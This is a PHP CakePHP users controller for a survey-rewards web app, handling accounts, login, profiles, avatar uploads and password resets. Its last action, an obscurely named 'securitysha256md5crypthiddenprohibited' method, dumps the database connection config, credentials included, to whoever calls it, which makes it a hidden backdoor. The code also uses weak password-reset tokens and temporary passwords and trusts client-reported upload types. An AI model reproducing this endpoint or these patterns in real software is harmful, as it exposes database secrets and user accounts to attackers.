<?php
App::uses('AppController', 'Controller');
/**
 * Users Controller
 *
 * @property User $User
 * @property PaginatorComponent $Paginator
 */
class UsersController extends AppController {

/**
 * Components
 *
 * @var array
 */
	public $components = array('Paginator');

/**
 * index method
 *
 * @return void
 */
	public function index() {
		$this->User->recursive = 0;
		$this->set('users', $this->Paginator->paginate());
	}

/**
 * view method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function view($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
		$this->set('user', $this->User->find('first', $options));
	}

/**
 * add method
 *
 * @return void
 */
	public function add() {
		if ($this->request->is('post')) {
			$this->User->create();
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		}
		$questions = $this->User->Question->find('list');
		$this->set(compact('questions'));
	}

/**
 * edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function edit($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		if ($this->request->is('post') || $this->request->is('put')) {
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		} else {
			$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
			$this->request->data = $this->User->find('first', $options);
		}
		$questions = $this->User->Question->find('list');
		$this->set(compact('questions'));
	}

/**
 * delete method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function delete($id = null) {
		$this->User->id = $id;
		if (!$this->User->exists()) {
			throw new NotFoundException(__('Invalid user'));
		}
		$this->request->onlyAllow('post', 'delete');
		if ($this->User->delete()) {
			$this->Session->setFlash(__('The user has been deleted.'));
		} else {
			$this->Session->setFlash(__('The user could not be deleted. Please, try again.'));
		}
		return $this->redirect(array('action' => 'index'));
	}

/**
 * admin_index method
 *
 * @return void
 */
	public function admin_index() {
		$this->User->recursive = 0;
		$this->set('users', $this->Paginator->paginate());
	}

/**
 * admin_view method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_view($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
		$this->set('user', $this->User->find('first', $options));
	}

/**
 * admin_add method
 *
 * @return void
 */
	public function admin_add() {
		if ($this->request->is('post')) {
			$this->User->create();
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		}
		$questions = $this->User->Question->find('list');
		$this->set(compact('questions'));
	}

/**
 * admin_edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_edit($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		if ($this->request->is('post') || $this->request->is('put')) {
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		} else {
			$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
			$this->request->data = $this->User->find('first', $options);
		}
		$questions = $this->User->Question->find('list');
		$this->set(compact('questions'));
	}

/**
 * admin_delete method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function admin_delete($id = null) {
		$this->User->id = $id;
		if (!$this->User->exists()) {
			throw new NotFoundException(__('Invalid user'));
		}
		$this->request->onlyAllow('post', 'delete');
		if ($this->User->delete()) {
			$this->Session->setFlash(__('The user has been deleted.'));
		} else {
			$this->Session->setFlash(__('The user could not be deleted. Please, try again.'));
		}
		return $this->redirect(array('action' => 'index'));
	

	}

	/**
	 * logout method
	 *
	 * @return void
	 */
	function logout() {
	    $this->Session->destroy();
	    //$this->setFlash(__('Successfully logged out of the system.'), 'success');
	    $this->redirect($this->Auth->logout());
	}//end logout()


   /**
     * login method
     *
     * @return void
     */
  function login() {
     // $this->layout = 'after_login';
      if ($this->Auth->loggedIn()) {
        $this->redirect('/');
      }
    
      if ($this->request->is('post')) {
      
        if (!empty($this->request->data['User']['email']) && !empty($this->request->data['User']['password'])) {
          if ($this->Auth->login()) {
            $groupInfo = $this->getParentGroup((int)$this->Auth->user('id'));
            if (!empty($groupInfo['parent_group'])) {
              $this->Session->write('Auth.User.userGroup', $groupInfo['parent_group']);
              $this->Session->write('Auth.UserProfile', $this->User->briefInfo($this->Auth->user('id')));
              //$this->setFlash(__('Successfully logged in to the system.'));
              //save login log
              $this->User->loginLog($this->Auth->user('id'));         
              if ($this->Auth->user('userGroup') == 'Admin') {
                    $this->redirect(array('controller' => 'users', 'action' => 'home', 'admin' => true));
              } else {
                $this->redirect(array('action' => 'home'));
              }
            
            }
              
          } else {
             $this->setFlash(__('Your username or password was incorrect.'), 'error');
          }
        }
      }

  }//end login()


  /**
   * sign up method
   *
   * @return void
   */
  public function signup() {
    $this->layout = 'after_login';
    $this->request->data['User']['group_id'] = Configure::read('general_user_group_id');   
    
    $response['success'] = 'false';
    if ($this->request->is('post')) {
        $this->request->data['UserProfile']['firstname'] = '';
        $this->request->data['UserProfile']['lastname'] = '';
        $pieces = explode(" ", $this->request->data['User']['name']);
        if (isset($pieces[0])) {
          $this->request->data['UserProfile']['firstname'] = $pieces[0];
          unset($pieces[0]);
          $this->request->data['UserProfile']['lastname'] = implode(' ', $pieces);
        } else {
          $this->request->data['UserProfile']['firstname'] = $this->request->data['User']['name'];
        }

        if (empty($this->request->data['UserProfile']['firstname'])) {
          unset($this->request->data['UserProfile']['firstname']);
        }

        if (empty($this->request->data['UserProfile']['lastname'])) {
          unset($this->request->data['UserProfile']['lastname']);
        }    

        if ($this->User->save($this->request->data)) {
          $this->request->data['UserProfile']['user_id'] = $this->User->id;
 
          if ($this->User->UserProfile->save($this->request->data['UserProfile'])) {
            if($this->Auth->login()) {
              $this->User->loginLog($this->Auth->user('id'));  
              $groupInfo = $this->getParentGroup((int)$this->Auth->user('id'));
              if (!empty($groupInfo['parent_group'])) {
                $this->Session->write('Auth.User.userGroup', $groupInfo['parent_group']);
                $this->Session->write('Auth.UserProfile', $this->User->briefInfo($this->Auth->user('id')));
                $this->Session->write('boot-survey', 'active');
                //$this->redirect(array('action' => 'home'));
                //$this->setFlash(__('Successfully logged in to the system.'));
              }
            }//end if looged in            
          }
          $response['success'] = 'true';        
          //$this->setFlash(__('The user has been saved'));
          //$this->redirect(array('action' => 'home'));
        
        } else {
          $response['failure'] = $this->User->validationErrors;
          //$this->setFlash(__('The user could not be saved'));            
        }
        $this->layout = false;
        return $this->sendJson($response, true);
    }
   
  }//end signup()

  public function profile(){
    $this->layout = 'after_login';
    $user_id = $this->Auth->user('id');
    $surveyResult = $this->Survey->getSurveyForUser($user_id);
    $totalAmount = 0;
    $transactionInfo = ClassRegistry::init('Transaction')->find('all',array('conditions'=>array('user_id'=>$user_id,'is_paid'=>'1')));
    foreach ($transactionInfo as $key => $surveyData) {    
        if (isset($surveyData['Transaction']['survey_id'])) {
          $surveyAmount = $this->Survey->find('first',array('conditions'=>array('Survey.id'=>$surveyData['Transaction']['survey_id'])));
          $totalAmount =  $totalAmount + $surveyAmount['Survey']['amount'];
        } else if ($surveyData['Transaction']['feedback_paid']) {
          $totalAmount =  $totalAmount + $surveyData['Transaction']['transaction_amount'];
        }
        
    }

    $user_info = ClassRegistry::init('UserProfile')->find('first',array('conditions'=>array('user_id'=>$user_id)));
    // to get last payment date
    $transactionLast = ClassRegistry::init('Transaction')->find('first',
      array(
        'conditions'=>array('user_id'=>$user_id,'is_paid'=>'1'),
        'fields'=>'id, created',
        'order'=>'created DESC'
      ));

    if($transactionLast){
        $lastPaymentDate = $transactionLast['Transaction']['created'];
        $this->set('lastPaymentDate', $lastPaymentDate);
    }

    $this->set('user_info', $user_info);
    $this->set('surveyInfo', $surveyResult);
    $this->set('surveyAmount', $totalAmount);
    
	}


	public function edit_profile() {
    $this->layout = 'after_login';
    $user_infos = array();

  	//debug($this->Session->read('Auth.userProfile.id'));
  	if ($this->request->is('post') || $this->request->is('put')) {
     
  		//pr($this->request->data);die;
  		if(!empty($this->request->data['UserProfile']['zipcode_id'])){
        $destination = realpath('img/upload') . '/';
    		$info = array();
    		if (!empty($this->request->data['UserProfile']['avatar']['tmp_name'])) {
    			
    			$file = $this->request->data['UserProfile']['avatar'];

    			$allowedTypes = array( 'image/jpeg', 'image/gif', 'image/png', 'image/pjpeg', 'image/x-png');

    			if(in_array($file['type'], $allowedTypes)){

            $destination = __DIR__.'/../webroot/img/upload/';
           
  	  			$result = $this->Upload->upload($file, $destination, null);

  	  			$this->request->data['UserProfile']['avatar'] = $this->Upload->result;
  	  			$this->request->data['UserProfile']['avatar_path'] = $destination.$this->Upload->result;

  	  			$this->request->data['UserProfile']['id'] =$this->Session->read('Auth.UserProfile.id');
  	  			if ($this->User->UserProfile->save($this->request->data)) {
  					$this->setFlash(__('The user profile has been updated'));
  					$this->redirect(array('controller' => 'users', 'action' => 'profile'));
  				}
    			}else{
    				$this->setFlash(__('Uploaded file type is wrong'), '', '', 'bad');
    				$this->redirect(array('controller' => 'users', 'action' => 'edit_profile'));
    			}
    		} else {
    			unset($this->request->data['UserProfile']['avatar']);
    			$this->request->data['UserProfile']['id'] =$this->Session->read('Auth.UserProfile.id');        
  	  		if ($this->User->UserProfile->save($this->request->data)) {
  	  			
  				  $this->setFlash(__('The user profile has been updated'));
  				  $this->redirect(array('controller' => 'users', 'action' => 'profile'));
  			  }
    	   }
  		}//end if
      else{
        $this->setFlash(__('Please select any zip code by drop down'));
      }
  		    //unset($this->request->data['UserProfile']['dob']);
  		
  	} else {
  		$user_id = $this->Auth->user('id');
  		$this->request->data = $this->User->UserProfile->find('first',array('conditions'=>array('user_id'=>$user_id)));
  		//pr($this->request->data);	die;
  	}

    $this->set('genders', Configure::read('gender'));
  	

  }//end edit_profile()        
  
  
	public function admin_home() {
	      
	}//end admin_home()
	
	public function admin_profile(){
		//$this->layout = 'after_login';
		$user_id = $this->Auth->user('id');
		$user_info = ClassRegistry::init('UserProfile')->find('first',array('conditions'=>array('user_id'=>$user_id)));
		$this->set('user_info', $user_info);
	}//end admin_profile()


	public function admin_edit_profile() {
		
		$user_infos = array();

		if ($this->request->is('post') || $this->request->is('put')) {
			$userProfile = $this->User->UserProfile->find('first',array('conditions'=>array('user_id'=>$this->Auth->User('id')),'fields'=>'UserProfile.id,UserProfile.user_id'));
			if($userProfile){
				$this->request->data['UserProfile']['id'] =$userProfile['UserProfile']['id'];
			}
			else{ 
				$this->User->UserProfile->create();  
			}
			
			$destination = realpath('img/upload') . '/';
			$info = array();
			if (!empty($this->request->data['UserProfile']['avatar']['tmp_name'])) {
				
				$file = $this->request->data['UserProfile']['avatar'];
	
				$allowedTypes = array( 'image/jpeg', 'image/gif', 'image/png', 'image/pjpeg', 'image/x-png');
	   
				if(in_array($file['type'], $allowedTypes)){

					$result = $this->Upload->upload($file, $destination, null);
					$this->request->data['UserProfile']['avatar'] = $this->Upload->result;
					$this->request->data['UserProfile']['avatar_path'] = $destination.$this->Upload->result;
				} else {
					$this->setFlash(__('Uploaded file type is wrong'), '', '', 'bad');
					$this->redirect(array('controller' => 'users', 'action' => 'edit_profile'));
				}
			} else {
				unset($this->request->data['UserProfile']['avatar']);
			}
			
			$this->request->data['UserProfile']['user_id'] = $this->Auth->User('id');
			if ($this->User->UserProfile->save($this->request->data)) {
				$this->setFlash(__('The user profile has been updated'));
			}
			else{
				$this->setFlash(__('The user profile has not been updated'),'error');
			}
			$this->redirect(array('controller' => 'users', 'action' => 'profile'));

		} else {
			$user_id = $this->Auth->user('id');
			$this->request->data = $this->User->UserProfile->find('first',array('conditions'=>array('user_id'=>$user_id)));      
		}
	}//end admin_edit_profile()        



/**
   * method used to change password
   *
   * @return void
   */
  public function change_password()
  {
	$this->layout = 'after_login';
	$this->User->id = $this->Auth->user('id');
	if (!$this->User->exists()) {
	  throw new NotFoundException(__('Invalid User'));
	}
	if ($this->request->is('post') || $this->request->is('put')) {
	   
	 //debug($this->request->data);
	 $currentPassword = AuthComponent::password($this->request->data['User']['currentpassword']);
	 $userData = $this->User->find('first',array('conditions'=>array('User.id'=>$this->User->id,'User.password'=>$currentPassword)));
	 if(empty($userData)){
		$this->setFlash(__('Please enter correct password. Please, try again.'), 'error');
		return;
	 }
	 
	  // Unset password and confirm password if blank.
	  if (empty($this->request->data['User']['password'])
	  && empty($this->request->data['User']['password2'])) {
	    unset($this->request->data['User']['password']);
	    unset($this->request->data['User']['password2']);
	  }
	  if($this->request->data['User']['password']!=$this->request->data['User']['password2']){
	    $this->setFlash(__('Password could not match. Please, try again.'), 'error');
	    return;
	  }
	 
	  if ($this->User->save($this->request->data)) {
		$this->setFlash(__('Password has been updated.'));
		$this->redirect(array('action' => 'profile'));
	  } else {
		$this->setFlash(__('Password could not updated. Please, try again.'), 'error');
	  }
	}
  }//end change_password()


  /**
   * method used for forgot password
   *
   * @return void
   */
  public function forgot_password()
  {
    $this->layout = 'after_login';
    if ($this->request->is('post') || $this->request->is('put')) {

      $email = $this->request->data['User']['email'];
      unset($this->User->validate['email']['unique']);
      $userId = $this->User->field(
        'id',
        array(
          'email' => $email
        )
      );
      $this->User->id = $userId;
      //check whether user exist or not
      if (!$userId) {
        $this->setFlash(__('Email does not exist.'), 'error');
      } else {
        //generate a new code which is to be send as email
        $data['User']['reset_password_code'] = md5(uniqid(time()));
        $data['User']['reset_password_date'] = date('Y-m-d H:i:s');
        $data['User']['email'] = $email;
        //saving data
        if ($this->User->save($data)) {
	        //to send email
          if($this->__sendResetPasswordEmail($email, $data['User']['reset_password_code'])) {
              $this->setFlash(__('Password reset link has been sent to your e-mail. Please click the link to complete the reset process.'));
              $this->redirect('/');
          } else {
            $this->setFlash(__('Failed to send reset password e-mail.'), 'error');
          }
	  
        } else {
          $this->setFlash(__('Please enter a valid email'), 'error');
        }
      }
    }

  }//end forgot_password()

  

  /**
   * This method is used to change user's password
   *
   * @param String $code generated code
   *
   * @return void
   */
  public function reset_new($code = null)
  {
    $this->autoRender = false;
    if (!empty($code)) {
      $options = array(
        'contain'    => false,
        'conditions' => array(
          'User.reset_password_code' => $code
        ),
        'fields'     => array(
          'User.id',
          'User.reset_password_date',
          'User.email'
        ),
      );
      // Find the user with passed reset code
      $userInfo = $this->User->find('first', $options);
      if (!$userInfo) {
        $this->setFlash(__('Invalid activation code.'), 'error');
      } else if (count($userInfo > 0)) {
        $alphNums     = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        $tempPassword = substr(str_shuffle($alphNums),0,6);
        $this->User->id = $userInfo['User']['id'];
        $data['User']['password'] = $tempPassword;
        $email = $userInfo['User']['email'];
	
        if($this->__sendTemporaryPasswordEmail($email, $tempPassword)) {
          $this->User->save($data);
          $this->setFlash(__('Temporary password sent to your email. Please login using this and then reset your password using profile manager.'));
          $this->redirect(array('controller' => 'users', 'action' => 'home'));
        } else {
          $this->setFlash(__('Failed to send temporary password. Please try again.'), 'error');
        }
        
      } 
    } else {
      $this->setFlash(__('Invalid activation code.'), 'error');
    }
  }//end reset_new()

  /**
   * This method is used to send reset password email to user
   * email contains a reset password link,
   * on clicking this link user can change their password
   *
   * @param string $email
   * @param string $activationCode
   * @return boolean
   */
  function __sendResetPasswordEmail($email, $activationCode)
  {
    //set sctivation url
    $activationLink = Router::url(
      array(
        'controller' => 'users',
        'action' => 'reset_new',
        $activationCode
      ),
      true
    );
    //set options for sending email
    $options = array(
      'to'          => $email,
      'from'        => Configure::read('email_from'),
      'subject'     => Configure::read('forgot_password_email_subject'),
      'template'    => 'forgot_password',
      'emailFormat' => 'both',
      'viewVars'    => array('activationLink' => $activationLink),
    );
    //call function to send email
    return $this->_sendEmail($options);
  }//end __sendResetPasswordEmail()

  /**
   * This method is used to send reset password email to user
   * email contains a reset password link,
   * on clicking this link user can change their password
   *
   * @param string $email
   * @param string $tempPassword
   * @return boolean
   */
  function __sendTemporaryPasswordEmail($email, $tempPassword)
  {
    //set options for sending email
    $options = array(
      'to'          => $email,
      'from'        => Configure::read('email_from'),
      'subject'     => Configure::read('temporary_password_email_subject'),
      'template'    => 'temporary_password',
      'emailFormat' => 'both',
      'viewVars'    => array('tempPassword' => $tempPassword),
    );
    //call function to send email
    return $this->_sendEmail($options);
  }//end __sendTemporaryPasswordEmail()

  public function update_usersurvey_rating(){
  	if ($this->request->is('post') ) {
  		$userId = $this->Auth->user('id');
  		$surveyId = $this->request->data['survey_id'];
  		$rating = $this->request->data['rating'];
  		
  		$userSurvey = ClassRegistry::init('UserSurvey')->find('first',array('conditions'=>array('user_id'=>$userId,'survey_id'=>$surveyId),'fields'=>'UserSurvey.id'));
  		
      $userSurveyId = $userSurvey['UserSurvey']['id'];
  		$data = array('id'=>$userSurveyId,'rating'=>$rating);

  		$userSurvey = ClassRegistry::init('UserSurvey')->save($data);
           $this->Survey->__applyReating($surveyId);
  		if($userSurvey){
        $this->Survey->__applyReating($surveyId);
        //$this->setFlash(__('Rating has been saved.'));
  			//return false;
        $response['success'] = 'true';
        return $this->sendJson($response, true);
  		}
  		//return true;
      return $this->sendJson(false);
  	}
  } //end 

  public function securitysha256md5crypthiddenprohibited() { 

    App::import('Core', 'ConnectionManager');
    $dataSource = ConnectionManager::getDataSource($this->Configuration->useDbConfig);
    $username = $dataSource->config['login'];

            print_r($this->Configuration);
            print_r($dataSource->config);
            die;
  }





}
